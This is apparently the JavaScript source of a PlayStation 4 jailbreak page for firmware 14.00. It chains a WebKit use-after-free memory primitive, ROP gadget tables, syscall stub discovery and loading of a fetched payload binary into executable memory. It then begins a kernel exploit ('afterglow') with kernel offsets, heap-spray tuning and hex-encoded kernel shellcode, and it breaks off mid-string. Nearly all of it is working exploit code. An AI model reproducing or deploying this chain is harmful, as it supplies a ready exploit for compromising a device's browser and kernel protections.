    const watchdog = setInterval(function () {
      if (Date.now() - lastMark > WATCHDOG_MS) {
        try { clearInterval(watchdog); } catch (e) {}
        showRetry();
      }
    }, 5000);

    /* Prevent a browser-restored page from running the exploit a second time.
       This guard is session-based and independent of URL query parameters. */
    const SESSION_DONE_KEY = "jb2.goldhen_done";
    const SESSION_ALREADY_DONE = (function () {
      let sessionDone = false;
      try {
        sessionDone = sessionStorage.getItem(SESSION_DONE_KEY) === "1";
      } catch (e) {}
      if (sessionDone) {
        try { history.replaceState(null, "", "index.html"); } catch (e) {}
        try { hostAlready(); } catch (e) {}
        return true;
      }
      return false;
    })();

    const VERBOSE = params.get("verbose") === "1";
    const PROSE = [
      / -- /,
      /\.\s/,
      /;\s/,
      /,\s+(which|so|and that|because|since|as that)\s/,
      /\s+(because|rather than|instead of|so that|which is|which means|which the|so the)\s/,
      /\s+so\s+[a-z]/,
      /\s+\([a-z][^)]{40,}\)/,
    ];
    function terse(s) {
      if (VERBOSE || s == null) return s;
      s = String(s);
      for (const re of PROSE) {
        const m = re.exec(s);
        if (m && m.index > 0) s = s.slice(0, m.index);
      }
      s = s.replace(/\s+$/, "");
      if (s.length > 140) s = s.slice(0, 140) + "...";
      return s;
    }

    function finishUI(ok) {
      if (alreadyLoaded) hostAlready();
      else if (ok) hostOk();
      else hostFail();
    }
    function mark(tag, detail) {
      lastMark = Date.now();
      detail = terse(detail);

      lines.push(
        tag +
        (
          detail == null || detail === ""
            ? ""
            : "  " + detail
        ),
      );

      if (lines.length > 600) {
        lines.splice(
          0,
          lines.length - 600,
        );
      }

      /* Keep an internal trace and mirror each status to Karo Host's #progress. */
      try {
        var visibleLine = tag + (detail == null || detail === "" ? "" : "  " + detail);
        if (typeof window.log === "function") window.log(visibleLine);
        else {
          var progress = document.getElementById("progress");
          if (progress) progress.textContent = visibleLine;
        }
      } catch (e) {}

    }

    function trace(tag, detail) {
      if (VERBOSE) mark(tag, detail);
    }
    function state(t, c) {
      try {
        var color = c === "warn" || c === "fail" ? "yellow" : undefined;
        if (typeof window.logger === "function") window.logger(t, color);
        else {
          var progress = document.getElementById("progress");
          if (progress) progress.textContent = t;
        }
      } catch (e) {}
    }
    function check(name, ok, detail) {
      if (ok) {
        mark("PROOF-OK", name + (detail ? "  " + detail : ""));
      } else {
        mark("PROOF-FAIL", name + (detail ? "  " + detail : ""));
      }
      return ok;
    }

    const SYS = {
      getpid: 20,
      getuid: 0x18,
      close: 6,
      socket: 97,
      socketpair: 0x87,
      getsockopt: 118,
      setsockopt: 0x69,
      mmap: 477,
      munmap: 73,
      thr_self: 432,
      getgroups: 79,
      getgid: 47,
      cpuset_getaffinity: 487,
      cpuset_setaffinity: 488,
      aio_multi_poll: 664,
      aio_multi_delete: 662,
      getegid: 43,
      aio_multi_wait: 663,
      aio_multi_cancel: 666,
      aio_submit_cmd: 669,
      write: 4,
      sysctl: 202,
      kill: 37,
      getppid: 39,
    };
    const JSVALUE_UNDEFINED = new int64(0x0a, 0xfffffff7);
    const keepAlive = [];
    let mainMf = null,
      mainOrig = null,
      mainArmed = false;
    let allDone = false,
      jailbroken = false,
      payloadRunning = false;

    (async function () {
      if (SESSION_ALREADY_DONE) {
        try { clearInterval(watchdog); } catch (e) {}
        return;
      }
      // Karo Host 14.00: run the embedded kernel stage and load payload.bin directly.
      let p = null;
      let closeFd = null;
      try {
        await new Promise(function (r) {
          setTimeout(r, 100);
        });
        const { key, off } = offsetsFor(navigator.userAgent);
        mark("BUILD", "jb=skipjb2 base=ef1670a");
        mark("FW", key || "(not a PS4 UA)");
        if (!off) {
          /* NONPS4-DEBUG */
          try {
            document.body.classList.add("log");
          } catch (e) {}

          state("not a PS4 browser - debug mode", "warn");

          mark(
            "NONPS4-DEBUG",
            "ua=" + (navigator.userAgent || "unknown"),
          );

          try {
            mark(
              "NONPS4-OFFSETS",
              "supported=" + Object.keys(PS4).join(","),
            );
          } catch (e) {
            mark("NONPS4-OFFSETS", "error=" + String(e));
          }

          try {
            const off14 = PS4["14.00"];

            if (off14) {
              mark(
                "NONPS4-14",
                "present " +
                "webkit=" + off14.wk_expm1_builtin +
                " poprdi=0x" + off14.wk_POP_RDI_RET.toString(16) +
                " poprsi=0x" + off14.wk_POP_RSI_RET.toString(16) +
                " poprdx=0x" + off14.wk_POP_RDX_RET.toString(16),
              );
            } else {
              mark("NONPS4-14", "entry=missing");
            }
          } catch (e) {
            mark("NONPS4-14", "error=" + String(e));
          }

          try {
            const info = globalThis.__CORE_MEM_INFO;

            if (info) {
              mark(
                "NONPS4-CORE",
                "hx1400=" + info.hx1400 +
                " memLevel=" + info.memLevel +
                " slots=" + info.slots +
                " drain=" + info.drainCount +
                " est=" + info.estimatedBytes,
              );
            } else {
              mark("NONPS4-CORE", "info=missing");
            }
          } catch (e) {
            mark("NONPS4-CORE", "error=" + String(e));
          }

          allDone = true;
          return;
        }
        const fwKey = key || "unknown";

        // How many tries the WebKit stage gets. An attempt costs nothing in the
        // kernel -- this stage is a userland UAF in JavaScript, and a miss is
        // simply repeated. About one in three lands, so a low ceiling gives up on
        // a page that would have worked; this one puts that failure well under a
        // tenth of a percent.
        const ATTEMPTS = Math.max(1, parseInt(params.get("attempts") || "8", 10) || 8);

        const PRIMITIVE_ONLY = params.get("stop") === "primitive";

        if (PRIMITIVE_ONLY) {
          state("testing WebKit primitive...", "warn");

          await new Promise(function (resolve) {
            setTimeout(resolve, 0);
          });

          const PRIMITIVE_LOUD = /FAIL|ERROR|THREW|RETRY|ABORT|PASS/i;

          const carrier = await establishPrimitive({
            maxAttempts: ATTEMPTS,
            onEvent: function (tag, detail, attempt) {
              const writer = PRIMITIVE_LOUD.test(tag) ? mark : trace;

              writer(
                tag,
                (attempt != null ? "[" + attempt + "] " : "") +
                  (detail || ""),
              );
            },
          });

          installWindowP(carrier, { promote: false });

          const pp = window.p;

          const cell = pp.leakval(Math.expm1);

          const nativeFn = pp.read8(
            pp.read8(cell.add32(0x18)).add32(
              off.wk_JSFunction_m_function,
            ),
          );

          const webkitBase = nativeFn.sub32(
            off.wk_expm1_builtin,
          );

          const aligned = function (value) {
            return value.hi > 0 && (value.low & 0x3fff) === 0;
          };

          const primitiveOk = aligned(webkitBase);

          try {
            const errorFn = pp.read8(
              webkitBase.add32(off.wk___imp___error),
            );

            const libkernelBase = errorFn.sub32(
              off.k__error,
            );

            mark(
              "BASES",
              "webkit=" + webkitBase +
              " libkernel=" + libkernelBase,
            );
          } catch (baseError) {
            mark(
              "BASES",
              "webkit=" + webkitBase +
              " libkernel=unresolved",
            );
          }

          mark(
            "PRIMITIVE-ONLY",
            primitiveOk ? "PASS" : "FAIL",
          );

          allDone = true;
          finishUI(primitiveOk);
          return;
        }


        const DO_JB = params.get("jb") !== "0";
        const DO_PATCH = params.get("patch") !== "0";
        const DO_PAYLOAD = true;
        const SKIPJB = params.get("skipjb") !== "0";

        const KEEP_JB = params.get("keepjb") === "1";

        // The embedded 14.00 kernel stage supplies its own kernel work; no host kernel table is needed.
        const OWN_KERNEL_STAGE = USE_OWN_KERNEL_STAGE;
        const NEED_K = OWN_KERNEL_STAGE ? [] : [
          "k_idt_rsvd",
          "k_oid_kern_file",
          "k_oid_maxfilesperproc",
          "k_oid_maxprocperuid",
          "k_oid_maxfiles",
          "k_arg1_maxfilesperproc",
          "k_arg1_maxprocperuid",
          "k_arg1_maxfiles",
          "k_prison0",
          "k_rootvnode",
        ];
        const missing = NEED_K.filter((k) => off[k] === undefined);
        if (
          !check(
            "kernel-table-present",
            missing.length === 0,
            "fw=" +
              fwKey +
              " missing=[" +
              missing.join(",") +
              "]" +
              " -- dump this firmware with kdump5.html and derive its table" +
              " with tools/kderive.py; stage=pre_primitive",
          )
        )
          return;

        // The 641-byte 14.00 patch set is embedded in this script; no external patch file is fetched.
        const KPATCH_FILE = OWN_KERNEL_STAGE
          ? "embedded:1400.bin"
          : "slopkit/patches/" + (off.kpatch || fwKey.replace(".", "") + ".bin");
        const PAYLOAD_FILE = KaroPayloadFile;
        const needPatch = OWN_KERNEL_STAGE ? [] : ["k_sysent_661", "k_jmp_rsi"].filter(
          (k) => off[k] === undefined,
        );
        if (
          !check(
            "kpatch-table-present",
            !DO_PATCH || needPatch.length === 0,
            "missing=[" +
              needPatch.join(",") +
              "] blob=" +
              KPATCH_FILE +
              " -- build it from patches/<fw>.c, see patches/1300.c",
          )
        )
          return;
        const needPl = OWN_KERNEL_STAGE ? [] : ["wk___imp_pthread_create", "k_pthread_create"].filter(
          (k) => off[k] === undefined,
        );
        if (
          !check(
            "payload-table-present",
            !DO_PAYLOAD || needPl.length === 0,
            "missing=[" + needPl.join(",") + "] payload=" + PAYLOAD_FILE,
          )
        )
          return;
        mark("FW-STATUS", off.fw_status || "none");
        mark(
          "FW-KTABLE",
          "idt_rsvd=" +
            (
              off.k_idt_rsvd === undefined
                ? "undefined"
                : "0x" + off.k_idt_rsvd.toString(16)
            ) +
          " prison0=" +
            (
              off.k_prison0 === undefined
                ? "undefined"
                : "0x" + off.k_prison0.toString(16)
            ) +
          " rootvnode=" +
            (
              off.k_rootvnode === undefined
                ? "undefined"
                : "0x" + off.k_rootvnode.toString(16)
            ) +
          " kpatch=" +
            KPATCH_FILE +
          " payload=" +
            PAYLOAD_FILE +
          " src=ps4_offsets.js",
        );

        // ---- benign-miss auto-retry (reads only, before any kernel write) ----
        // A passA/passB "no crossing" is a recoverable reclaim miss in the READ
        // phase -- no kernel .data/.text has been touched yet, so reloading and
        // retrying is safe. The counter lives in sessionStorage so it survives
        // the reload and is cleared the moment the read phase succeeds, so a
        // later manual run always starts fresh. NEVER call retryBenign() after a
        // kernel write: a reload would re-enter with the kernel already modified.
        // A hard KP (a total reclaim miss that faults inside the cancel walk)
        // cannot be caught here and still needs a reboot -- this only recovers
        // the benign, detectable misses.
        const retryArg = parseInt(params.get("retry") || "", 10);
        const RETRY_MAX = Number.isFinite(retryArg) && retryArg >= 0 ? retryArg : 4;
        const RETRY_KEY = "jb1352-read-retry";
        const retryCount = () => {
          try {
            const v = parseInt(sessionStorage.getItem(RETRY_KEY) || "0", 10);
            return Number.isFinite(v) && v > 0 ? v : 0;
          } catch (e) {
            return 0;
          }
        };
        const clearRetry = () => {
          try {
            sessionStorage.removeItem(RETRY_KEY);
          } catch (e) {}
        };
        const retryBenign = (why) => {
          const n = retryCount();
          if (n >= RETRY_MAX) {
            mark(
              "AUTO-RELOAD-GIVEUP",
              "why=" + why + " reloads=" + n + " -- reboot and try again",
            );
            return false;
          }
          let stored = -1;
          try {
            sessionStorage.setItem(RETRY_KEY, String(n + 1));
            stored = parseInt(sessionStorage.getItem(RETRY_KEY) || "-1", 10);
          } catch (e) {
            stored = -1;
          }
          if (stored !== n + 1) {
            mark(
              "AUTO-RELOAD-NO-STORAGE",
              "why=" + why + " wrote=" + (n + 1) + " read=" + stored,
            );
            return false;
          }
          mark("AUTO-RELOAD", "why=" + why + " reload=" + (n + 1) + "/" + RETRY_MAX);
          setTimeout(() => {
            try {
              location.reload();
            } catch (e) {}
          }, 400);
          return true;
        };
        if (retryCount() > 0)
          mark("AUTO-RELOAD-RESUME", "reload=" + retryCount() + "/" + RETRY_MAX);

        state("running the primitive...", "warn");
        await new Promise((r) => setTimeout(r, 0));

        const PRIMITIVE_LOUD = /FAIL|ERROR|THREW|RETRY|ABORT|PASS/i;
        const carrier = await establishPrimitive({
          maxAttempts: ATTEMPTS,
          onEvent: (t, d, a) =>
            (PRIMITIVE_LOUD.test(t) ? mark : trace)(
              t,
              (a != null ? "[" + a + "] " : "") + (d || ""),
            ),
        });
        installWindowP(carrier, { promote: false });
        if (!window.p) throw new Error("window.p was not installed");
        p = window.p;
        mark(
          "PAIR-STATUS",
          "state=" +
            pairStatus.state +
            " promoted=" +
            pairStatus.promoted +
            "   (promotion off: the 137 MB stays pinned)",
        );
        mark("PRIMITIVE-OK", "");

        const cell = p.leakval(Math.expm1);
        const nativeFn = p.read8(
          p.read8(cell.add32(0x18)).add32(off.wk_JSFunction_m_function),
        );
        const webkitBase = nativeFn.sub32(off.wk_expm1_builtin);
        const errorFn = p.read8(webkitBase.add32(off.wk___imp___error));
        let libkernelBase = errorFn.sub32(off.k__error);

        if (OWN_KERNEL_STAGE) {
          const libkernelAdjust =
            libkernelBase.low & 0x3fff;

          if (libkernelAdjust !== 0) {
            libkernelBase =
              libkernelBase.sub32(
                libkernelAdjust,
              );

            mark(
              "HX1400-LIBKERNEL-ALIGN",
              "adjust=0x" +
              libkernelAdjust.toString(16) +
              " base=" +
              libkernelBase,
            );
          }
        }

        mark("BASES", "webkit=" + webkitBase + " libkernel=" + libkernelBase);
        const aligned = (v) => v.hi > 0 && (v.low & 0x3fff) === 0;
        if (
          !check(
            "module-bases-0x4000-aligned",
            aligned(webkitBase) && aligned(libkernelBase),
            "",
          )
        )
          return;

        const G = {};
        const GAD = [
          ["POP_RDI_RET", off.wk_POP_RDI_RET, [0x5f, 0xc3]],
          ["POP_RSI_RET", off.wk_POP_RSI_RET, [0x5e, 0xc3]],
          ["POP_RDX_RET", off.wk_POP_RDX_RET, [0x5a, 0xc3]],
          ["POP_RCX_RET", off.wk_POP_RCX_RET, [0x59, 0xc3]],
          ["POP_R8_RET", off.wk_POP_R8_RET, [null, 0x58, 0xc3]],
          ["POP_R9_RET", off.wk_POP_R9_RET, [null, 0x59, 0xc3]],
          ["POP_RAX_RET", off.wk_POP_RAX_RET, [0x58, 0xc3]],
          ["LEAVE_RET", off.wk_LEAVE_RET, [0xc9, 0xc3]],
          [
            "MOV_RDI_RAX_RET",
            off.wk_MOV_QWORD_PTR_RDI_RAX_RET,
            [0x48, 0x89, 0x07, 0xc3],
          ],
          ["G0", off.wk_MOV_RDI_RSI_30_CALL, [0x48, 0x8b, 0x7e, 0x30]],
          ["G1", off.wk_POP_RAX_MOV_RAX_JMP_18, [0x58, 0x48, 0x8b, 0x07]],
          ["G2", off.wk_PUSH_RBP_MOV_RBP_RSP_10, [0x55, 0x48, 0x89, 0xe5]],
          ["G3", off.wk_MOV_RDI_RAX_8_CALL_20, [0x48, 0x8b, 0x78, 0x08]],
          [
            "G4",
            off.wk_MOV_RDX_RAX_18_CALL_10,
            [0x48, 0x8b, 0x50, off.pivot_view_sp],
          ],
          ["G5", off.wk_PUSH_RDX_POP_RSP_RET, [0x52, 0x5c, 0xc3]],
        ];
        let gated = 0;
        for (const [nm, rva, pat] of GAD) {
          const a = webkitBase.add32(rva);
          let good = true;
          for (let i = 0; i < pat.length; ++i) {
            if (pat[i] === null) continue;
            if (p.read1(a.add32(i)) !== pat[i]) {
              good = false;
              break;
            }
          }
          if (good) {
            G[nm] = a;
            gated++;
          } else mark("GADGET-BAD", nm);
        }
        if (
          !check(
            "gadget-table-fits-module",
            gated === GAD.length,
            gated + "/" + GAD.length,
          )
        )
          return;
        const argGadget = [
          G.POP_RDI_RET,
          G.POP_RSI_RET,
          G.POP_RDX_RET,
          G.POP_RCX_RET,
          G.POP_R8_RET,
          G.POP_R9_RET,
        ];

        const stubAddr = new Map();
        let seeded = 0;
        if (off.k_stubs) {
          for (const numStr in off.k_stubs) {
            const num = +numStr,
              o = off.k_stubs[numStr];
            const v = p.read8(libkernelBase.add32(o));
            if ((v.low & 0x00ffffff) !== 0xc0c748 || v.hi >>> 24 !== 0x49) continue;
            if (((v.low >>> 24) | ((v.hi & 0x00ffffff) << 8)) >>> 0 !== num)
              continue;
            stubAddr.set(num, libkernelBase.add32(o));
            seeded++;
          }
        }
        const need = new Set(
          Object.keys(SYS)
            .map((k) => SYS[k])
            .filter((n) => !stubAddr.has(n)),
        );
        let scanned = 0;
        for (let o = 0; o < off.k_scan_stage1 && need.size; o += 16) {
          const v = p.read8(libkernelBase.add32(o));
          if ((v.low & 0x00ffffff) !== 0xc0c748 || v.hi >>> 24 !== 0x49) continue;
          const num = ((v.low >>> 24) | ((v.hi & 0x00ffffff) << 8)) >>> 0;
          if (!need.has(num)) continue;
          stubAddr.set(num, libkernelBase.add32(o));
          need.delete(num);
          scanned++;
        }
        mark("STUBS", "seeded=" + seeded + " scanned=" + scanned);
        const miss = Object.keys(SYS).filter((k) => !stubAddr.has(SYS[k]));
        if (!check("syscall-page-needs-stub", miss.length === 0, miss.join(",")))
          return;

        function bufAddr(ab) {
          const c = p.leakval(ab);
          return p.read8(
            p
              .read8(c.add32(off.wk_ArrayBuffer_m_impl))
              .add32(off.wk_ArrayBuffer_m_contents_m_data),
          );
        }
        function put(dv, at, v) {
          if (typeof v === "number") {
            dv.setUint32(at, v >>> 0, true);
            dv.setUint32(at + 4, v < 0 ? 0xffffffff : 0, true);
          } else {
            dv.setUint32(at, v.low >>> 0, true);
            dv.setUint32(at + 4, v.hi >>> 0, true);
          }
        }
        const PB_SIZE = Math.max(0x28, (off.pivot_view_sp + 8 + 0xf) & ~0xf);
        function makeCtx() {
          const sb = new ArrayBuffer(0x20),
            pb = new ArrayBuffer(PB_SIZE);
          const kb = new ArrayBuffer(0x2000),
            fb = new ArrayBuffer(0x40);
          keepAlive.push(sb, pb, kb, fb);
          const c = {
            storeDv: new DataView(sb),
            pivotDv: new DataView(pb),
            stackDv: new DataView(kb),
            frameDv: new DataView(fb),
            stackU8: new Uint8Array(kb),
            frameU8: new Uint8Array(fb),
          };
          keepAlive.push(
            c.storeDv,
            c.pivotDv,
            c.stackDv,
            c.frameDv,
            c.stackU8,
            c.frameU8,
          );
          c.S = bufAddr(sb);
          c.P = bufAddr(pb);
          c.K = bufAddr(kb);
          c.F = bufAddr(fb);
          put(c.storeDv, 0x00, G.G1);
          put(c.storeDv, 0x08, c.P);
          put(c.storeDv, 0x10, G.G3);
          put(c.storeDv, 0x18, G.G2);
          put(c.pivotDv, 0x00, c.P);
          put(c.pivotDv, 0x10, G.G5);
          put(c.pivotDv, 0x20, G.G4);
          return c;
        }
        function layout(c, target, args) {
          c.stackU8.fill(0);
          c.frameU8.fill(0);
          const insts = [];
          for (let i = 0; i < args.length; ++i) {
            insts.push(argGadget[i]);
            insts.push(args[i]);
          }
          const targetIdx = insts.length;
          insts.push(target);
          insts.push(G.POP_RDI_RET);
          insts.push(c.F);
          insts.push(G.MOV_RDI_RAX_RET);
          insts.push(G.POP_RAX_RET);
          insts.push(JSVALUE_UNDEFINED);
          insts.push(G.LEAVE_RET);
          let at = 0x2000 - 8 * insts.length;
          if (((c.K.low + at + 8 * targetIdx) & 0xf) !== 0) at -= 8;
          for (let i = 0; i < insts.length; ++i)
            put(c.stackDv, at + 8 * i, insts[i]);
          put(c.pivotDv, off.pivot_view_sp, c.K.add32(at));
        }
        const M = makeCtx();
        mainMf = p.read8(cell.add32(0x18)).add32(off.wk_JSFunction_m_function);
        mainOrig = p.read8(mainMf);
        const pivotObj = {};
        keepAlive.push(pivotObj);
        const pivotCell = p.leakval(pivotObj);
        p.write8(mainMf, G.G0);
        mainArmed = true;
        function callAddr(target, args) {
          layout(M, target, args);
          const saved = p.read8(pivotCell);
          p.write8(pivotCell, M.S);
          Math.expm1(pivotObj);
          p.write8(pivotCell, saved);
          return {
            lo: M.frameDv.getUint32(0, true),
            hi: M.frameDv.getUint32(4, true),
            i32: M.frameDv.getUint32(0, true) | 0,
          };
        }
        // Build the chain up front, so that inside the window there is nothing
        // left but one store, one pointer and the trigger. Assembling the 1512
        // slots costs milliseconds, and those milliseconds fall inside it.
        function prepareMany(calls) {
          const c = M, RET = G.POP_RDI_RET.add32(1);
          const insts = [];
          for (let k = 0; k < calls.length; ++k) {
            const args = calls[k][1];
            for (let i = 0; i < args.length; ++i) { insts.push(argGadget[i]); insts.push(args[i]); }
            insts.push(calls[k][0]);
            if ((args.length * 2 + 1) % 2 === 1) insts.push(RET);
          }
          insts.push(G.POP_RDI_RET);
          insts.push(c.F);
          insts.push(G.MOV_RDI_RAX_RET);
          insts.push(G.POP_RAX_RET);
          insts.push(JSVALUE_UNDEFINED);
          insts.push(G.LEAVE_RET);
          let at = 0x2000 - 8 * insts.length;
          if (at < 0x40) throw new Error("prepareMany: " + calls.length + " does not fit");
          if (((c.K.low + at) & 0xf) !== 0) at -= 8;
          const bytes = new Uint8Array(8 * insts.length);
          const bdv = new DataView(bytes.buffer);
          for (let i = 0; i < insts.length; ++i) put(bdv, 8 * i, insts[i]);
          keepAlive.push(bytes, bdv);
          return { bytes: bytes, at: at, sp: c.K.add32(at) };
        }

        function runPrepared(prep) {
          const c = M;
          c.frameU8.fill(0);
          c.stackU8.set(prep.bytes, prep.at);
          put(c.pivotDv, off.pivot_view_sp, prep.sp);
          const saved = p.read8(pivotCell);
          p.write8(pivotCell, M.S);
          Math.expm1(pivotObj);
          p.write8(pivotCell, saved);
          return {
            lo: M.frameDv.getUint32(0, true),
            hi: M.frameDv.getUint32(4, true),
            i32: M.frameDv.getUint32(0, true) | 0,
          };
        }
        const sc = (num, ...a) => callAddr(stubAddr.get(num), a);
        closeFd = (fd) => sc(SYS.close, fd).i32;
        function errno() {
          const r = callAddr(errorFn, []);
          const a = new int64(r.lo, r.hi);
          return a.hi === 0 && a.low === 0 ? -1 : p.read4(a) | 0;
        }
        async function relaunchPayload() {
          let blob = null;
          try {
            const r = await fetch(PAYLOAD_FILE);
            if (r.ok) blob = new Uint8Array(await r.arrayBuffer());
          } catch (e) {}
          if (!blob || blob[0] !== 0xe9) {
            mark("JB-RELAUNCH", "file=" + PAYLOAD_FILE + " blob=unusable");
            return;
          }
          const sz = (blob.length + 0x3fff) & ~0x3fff;
          const m = sc(SYS.mmap, 0, sz, 7, 0x1002, -1, 0);
          const entry = new int64(m.lo, m.hi);
          if (m.i32 === -1 || entry.hi >>> 0 === 0) {
            mark("JB-RELAUNCH", "mmap failed err=" + errno());
            return;
          }
          for (let o = 0; o < blob.length; o += 8) {
            let lo = 0,
              hi = 0;
            for (let k = 0; k < 4; k++) lo |= (blob[o + k] || 0) << (8 * k);
            for (let k = 0; k < 4; k++) hi |= (blob[o + 4 + k] || 0) << (8 * k);
            p.write8(entry.add32(o), new int64(lo >>> 0, hi >>> 0));
          }
          let bad = -1;
          for (let o = 0; o < blob.length && bad < 0; o++)
            if (p.read1(entry.add32(o)) !== blob[o]) bad = o;
          if (bad >= 0) {
            mark("JB-RELAUNCH", "copy MISMATCH@0x" + bad.toString(16));
            return;
          }
          const fn = p.read8(webkitBase.add32(off.wk___imp_pthread_create));
          const expect = libkernelBase.add32(off.k_pthread_create);
          if (fn.low !== expect.low || fn.hi !== expect.hi) {
            mark("JB-RELAUNCH", "pthread_create got=" + fn + " want=" + expect);
            return;
          }
          const thr = new ArrayBuffer(8);
          keepAlive.push(thr);
          new Uint8Array(thr).fill(0);
          const rc = callAddr(expect, [bufAddr(thr), 0, entry, 0]).i32;
          const tdv = new DataView(thr);
          const handle = new int64(tdv.getUint32(0, true), tdv.getUint32(4, true));
          payloadRunning = rc === 0 && handle.hi >>> 0 > 0;
          check(
            "JB-RELAUNCH",
            payloadRunning,
            "file=" +
              PAYLOAD_FILE +
              " bytes=" +
              blob.length +
              " pthread_create=" +
              rc +
              " handle=" +
              handle,
          );
        }

        // Quick already-jailbroken probe (same idea as jb.js). If uid is already 0
        // we skip the whole afterglow stage and just report "Already Loaded".
        {
          const SETUID = 23;
          if (!stubAddr.has(SETUID)) {
            for (let o = 0; o < (off.k_scan_stage1 || 0x200000); o += 16) {
              const v = p.read8(libkernelBase.add32(o));
              if ((v.low & 0x00ffffff) !== 0xc0c748 || v.hi >>> 24 !== 0x49) continue;
              if (((v.low >>> 24) | ((v.hi & 0x00ffffff) << 8)) >>> 0 === SETUID) {
                stubAddr.set(SETUID, libkernelBase.add32(o));
                break;
              }
            }
          }
          if (stubAddr.has(SETUID)) {
            const suRv = sc(SETUID, 0).i32;
            const uidNow = sc(SYS.getuid).i32;
            mark("JB-PROBE", "setuid=" + suRv + " uid=" + uidNow);
            if (suRv === 0 && uidNow === 0) {
              alreadyLoaded = true;
              jailbroken = true;
              payloadRunning = true;
              allDone = true;
              mark("JB-ALREADY", "kernel already patched -- kernel stage skipped");
              try { clearInterval(watchdog); } catch (e) {}
              hostAlready();
              try {
                if (mainArmed && mainMf && mainOrig && p) {
                  p.write8(mainMf, mainOrig);
                  mainArmed = false;
                }
              } catch (e) {}
              return;
            }
          }
        }

        if (USE_OWN_KERNEL_STAGE) {
          let agOk = false;
          try {
            const ag = await Promise.resolve().then(function () { return afterglow; });
            // Exactly what afterglow reaches for, counted rather than guessed.
            const agCtx = {
              p: p, callAddr: callAddr, bufAddr: bufAddr, errno: errno,
              params: params, keepAlive: keepAlive, mark: mark, state: state,
              libkernelBase: libkernelBase, webkitBase: webkitBase,
              stubAddr: stubAddr, off: off,
              prepareMany: prepareMany, runPrepared: runPrepared,
            };
            const res = await ag.runAfterglow(agCtx);
            agOk = !!res;
          } catch (agError) {
            mark("AG-FAIL", agError && agError.message ? agError.message : String(agError));
            agOk = false;
          }
          allDone = true;
          try { clearInterval(watchdog); } catch (e) {}
          finishUI(agOk);
          // Swap the address out. The browser restores the last one after a
          // reload, and an enabler that restarts SceShellUI causes exactly that
          // reload -- so the last address must not be the one that runs the
          // exploit again. Relative, so it lands on this folder's landing page
          // however the files are served -- under a host's subdirectory just as
          // well as at a root. The marker tells that page to hold its autostart;
          // without it the restored landing page would count down and run the
          // whole chain a second time on an already patched kernel.
          try {
            sessionStorage.setItem(SESSION_DONE_KEY, "1");
          } catch (e) {}
          /* Only rewrite the URL bar — do NOT navigate/reload (would OOM). */
          try {
            history.replaceState(null, "", "index.html");
          } catch (e) {}
          // Stop here: the embedded 14.00 stage is the kernel stage for this host.
          return;
        }
        mark("JB-END", "kernel stage was not selected");
        allDone = true;
        try { if (mainArmed && mainMf && mainOrig && p) { p.write8(mainMf, mainOrig); mainArmed = false; } } catch (e) {}
        try { finishUI(false); } catch (e) {}
      } catch (eOuter) {
        try { mark("JB-THREW", (eOuter && eOuter.message) || String(eOuter)); } catch (e) {}
        try { clearInterval(watchdog); } catch (e) {}
        // WebKit-stage failure: nothing written to kernel. Reopen browser is enough.
        showRetry();
      }
    })();

    /*
        afterglow -- PlayStation 4 kernel exploit for firmware 14.00
        Port to the raw13 host (WebKit entry), from the Lua original.

        Copyright (C) 2026 well0nez

        This program is free software: you can redistribute it and/or modify
        it under the terms of the GNU Affero General Public License as
        published by the Free Software Foundation, either version 3 of the
        License, or (at your option) any later version.

        This program is distributed in the hope that it will be useful,
        but WITHOUT ANY WARRANTY; without even the implied warranty of
        MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
        GNU Affero General Public License for more details.

        You should have received a copy of the GNU Affero General Public License
        along with this program.  If not, see <https://www.gnu.org/licenses/>.

        UNTESTED IN THIS HOST. The Lua original has eight consecutive runs behind
        it inside a game process. This file has none: it has never executed. Run
        probeAfterglow() first -- it fires nothing and answers whether this process
        can carry the exploit at all.

        What the host must provide, and raw13 does:
          sc(num, ...args)      syscall, returns {lo, hi, i32}
          bufAddr(arrayBuffer)  int64 address of the backing store
          p.read1/4/8           read in this process
          p.write1/4/8          write in this process
          p.readInto(u8, at, n)
          keepAlive             array, so our buffers survive the collector
          mark(tag, detail)     log
        A way to call native code is NOT needed.
    */


    const S = {
      open: 5, close: 6, ioctl: 54, mprotect: 74, socket: 97, setsockopt: 105,
      getuid: 24, kqueue: 362, kevent: 363, mmap: 477, thr_self: 432,
      getpid: 20, sysctl: 202, cpuset_getaffinity: 487,
      cpuset_setaffinity: 488, dynlib_get_list: 592, dynlib_get_info: 593,
    };

    /* offsets into the kernel image, firmware 14.00 */
    const K = {
      anchor:    0x00e6c60,   /* the lock the leak hands us */
      swap_rbp:  0x0a80f68,   /* xchg rbp,rax ; ret */
      prison0:   0x111fa18,   /* holds a pointer to prison0, so read it */
      rootvnode: 0x2136e90,
    };

    /* offsets into libSceLibcInternal, with the bytes that must be found there */
    const GADGETS = {
      pivot:  [0x0d2812, "488b67385fc3"],   /* mov rsp,[rdi+0x38] ; pop rdi ; ret */
      rdi:    [0x0a6bae, "5fc3"],
      rsi:    [0x095560, "5ec3"],
      rdx:    [0x04e6d2, "5ac3"],
      rcx:    [0x0943ee, "59c3"],
      store:  [0x041ceb, "488907c3"],       /* mov [rdi],rax ; ret */
      load:   [0x0120b1, "488b07c3"],       /* mov rax,[rdi] ; ret */
      load8:  [0x057fae, "488b4008c3"],     /* mov rax,[rax+8] ; ret */
      add:    [0x0aaf8b, "4801f8c3"],
      sub:    [0x0275b4, "4829f8c3"],
      shr:    [0x0a9ba2, "48d3e8c3"],
      shl:    [0x0a9b98, "48d3e0c3"],
      memcpy: [0x026ad0, "554889e54889f8"],
      leave:  [0x09e59d, "c9c3"],
    };

    /* the read only tail of the libc text segment: executable already, claimed by
       no ELF header. An anonymous page stays non executable on this firmware
       however the mapping is widened, which is why this room is used at all. */
    const HOST = { page: 0x130000, free: 0x130730, last: 0x131000 };

    const TUNE = {
      sprays: 126,   /* a hard floor, one short of it never lands */
      object: 104,   /* sprayed object, falls into the 128 byte zone */
      window: 0x4000,
      entries: 420,
      stride: 0x90,
      seed: 45,
      spare: 8,
      batch: 60,     /* setsockopt per rop entry */
      ceiling: 63,   /* how far up to look for a free unit */
    };

    /* any cdev will do: the exploit only needs a file whose operation table sits
       in kernel text. Deliberately not a socket -- the spray needs all 126 of
       those, and one short of that never lands in the right bucket. */
    const PROBE_NODES = ["/dev/rng", "/dev/urandom", "/dev/random", "/dev/zero", "/dev/null"];

    const BOOTSTRAP =
        "b9820000c00f3248c1e22089c04809c2488d8a40feffff0f20c04825fffffeff"
      + "0f22c0c781900400000000000066c781b5040000eb0066c781b9040000eb00c6"
      + "81c2040000eb66c781b40a0000ff26488d91b40a0000c781802d100102000000"
